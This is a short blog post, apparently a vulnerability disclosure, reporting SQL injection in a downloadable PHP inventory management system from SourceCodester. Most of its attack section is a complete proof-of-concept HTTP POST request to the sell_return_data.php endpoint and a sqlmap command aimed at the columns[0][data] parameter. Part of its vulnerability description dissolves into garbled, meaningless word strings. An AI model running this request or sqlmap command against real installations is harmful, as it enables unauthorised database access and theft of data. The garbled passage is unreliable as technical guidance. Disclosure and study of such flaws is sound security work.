=== Content from medium.com_3c8e0365_20250114_222109.html ===
[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F7b955b5707eb&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderUser&source=---top_nav_layout_nav----------------------------------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40heishou%2Finventory-management-system-sql-injection-7b955b5707eb&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40heishou%2Finventory-management-system-sql-injection-7b955b5707eb&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)
# inventory management system SQL injection

[![heishou](https://miro.medium.com/v2/resize:fill:88:88/1*pR2bjEaLc11S00QyPXDWFA.png)](/%40heishou?source=post_page---byline--7b955b5707eb--------------------------------)

[heishou](/%40heishou?source=post_page---byline--7b955b5707eb--------------------------------)

·

[Follow](/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2Ffc1fddf341cd&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40heishou%2Finventory-management-system-sql-injection-7b955b5707eb&user=heishou&userId=fc1fddf341cd&source=post_page-fc1fddf341cd--byline--7b955b5707eb---------------------post_header-----------)

2 min read·Dec 26, 2023

--

Listen

Share

Manufacturer: [www.sourcecodester.com/](http://www.sourcecodester.com/)
 Download address: [www.sourcecodester.com/sites/default/files/download/mayuri\_k/ample.zip](http://www.sourcecodester.com/sites/default/files/download/mayuri_k/ample.zip)
 Affected Version: July 30, 2023
 Vulnerability Description:
 No filtering or escape operations are performed when user input is received. Using the LIKE operator in a query statement and inserting the $searchValue variable directly into it allows malicious users to insert malicious SQL statements by modifying the search.value field in POST requests.
 Passing the key names of the array `$searchArray’as parameter binding variable names to the preprocessed declaration section does not validate and filter whether these values are valid data types (e.g. strings). Therefore, there may be safety issues in some cases.
 Query sentence concatenation is complex and lack of consistency. To avoid errors and difficulties in reading, debugging, Please consider optimizing your ability to dynamically generate search queries by relying on multiple conditional add-on lists Command construction techniques Implementation methods such as placeholder/parameter column styles Placeholder / parameter column style or similar mechanism to eliminate a salient sign Risk source request can lead to failure All associations with known errors involving special characters Guide display Google items etc. Before and after adding database content You do not yet represent a weak argument Beautify the deep hypothesis Ensure that the selected fuzzy lookup feature is enabled quickly
 Defect Code:

![]()

POC:

```
POST /ample/app/ajax/sell_return_data.php HTTP/1.1
Host: localhost
Content-Length: 1192
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/ample/index.php?page=sell_return_list
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: USER_NAME_COOKIE=admin; SID_1=aa141d36; mailpoet_page_view=%7B%22timestamp%22%3A1694409700%7D; mailpoet_subscriber=%7B%22subscriber_id%22%3A2%7D; _ga=GA1.1.324136046.1702458922; Hm_lvt_6a3c7d9bb52a48ffadde32007d2a259e=1702459185; _pk_id.1.1fff=4343a030b8a53617.1702459185.; PHPSESSID=4dkogkibudrbl3gp8d6s3668q0
Connection: close

draw=1&columns%5B0%5D%5Bdata%5D=id&columns%5B0%5D%5Bname%5D=&columns%5B0%5D%5Bsearchable%5D=true&columns%5B0%5D%5Borderable%5D=true&columns%5B0%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B0%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B1%5D%5Bdata%5D=customer_name&columns%5B1%5D%5Bname%5D=&columns%5B1%5D%5Bsearchable%5D=true&columns%5B1%5D%5Borderable%5D=true&columns%5B1%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B1%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B2%5D%5Bdata%5D=invoice_id&columns%5B2%5D%5Bname%5D=&columns%5B2%5D%5Bsearchable%5D=true&columns%5B2%5D%5Borderable%5D=true&columns%5B2%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B2%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B3%5D%5Bdata%5D=return_date&columns%5B3%5D%5Bname%5D=&columns%5B3%5D%5Bsearchable%5D=true&columns%5B3%5D%5Borderable%5D=true&columns%5B3%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B3%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B4%5D%5Bdata%5D=amount&columns%5B4%5D%5Bname%5D=&columns%5B4%5D%5Bsearchable%5D=true&columns%5B4%5D%5Borderable%5D=true&columns%5B4%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B4%5D%5Bsearch%5D%5Bregex%5D=false&order%5B0%5D%5Bcolumn%5D=0&order%5B0%5D%5Bdir%5D=asc&start=0&length=10&search%5Bvalue%5D=&search%5Bregex%5D=false
```

SQLmap:

![]()

payload:

```
SQLmap:
python sqlmap.py -r 1.txt -p columns[0][data] --level 5 --risk 3
```

--

--

[![heishou](https://miro.medium.com/v2/resize:fill:96:96/1*pR2bjEaLc11S00QyPXDWFA.png)](/%40heishou?source=post_page---post_author_info--7b955b5707eb--------------------------------)[![heishou](https://miro.medium.com/v2/resize:fill:128:128/1*pR2bjEaLc11S00QyPXDWFA.png)](/%40heishou?source=post_page---post_author_info--7b955b5707eb--------------------------------)Follow[## Written by heishou](/%40heishou?source=post_page---post_author_info--7b955b5707eb--------------------------------)[1 Follower](/%40heishou/followers?source=post_page---post_author_info--7b955b5707eb--------------------------------)·[3 Following](/%40heishou/following?source=post_page---post_author_info--7b955b5707eb--------------------------------)

Pretending to make you fly

Follow
## No responses yet

[Help](https://help.medium.com/hc/en-us?source=post_page-----7b955b5707eb--------------------------------)[Status](https://medium.statuspage.io/?source=post_page-----7b955b5707eb--------------------------------)[About](/about?autoplay=1&source=post_page-----7b955b5707eb--------------------------------)[Careers](/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----7b955b5707eb--------------------------------)[Press](pressinquiries%40medium.com?source=post_page-----7b955b5707eb--------------------------------)[Blog](https://blog.medium.com/?source=post_page-----7b955b5707eb--------------------------------)[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----7b955b5707eb--------------------------------)[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----7b955b5707eb--------------------------------)[Text to speech](https://speechify.com/medium?source=post_page-----7b955b5707eb--------------------------------)[Teams](/business?source=post_page-----7b955b5707eb--------------------------------)


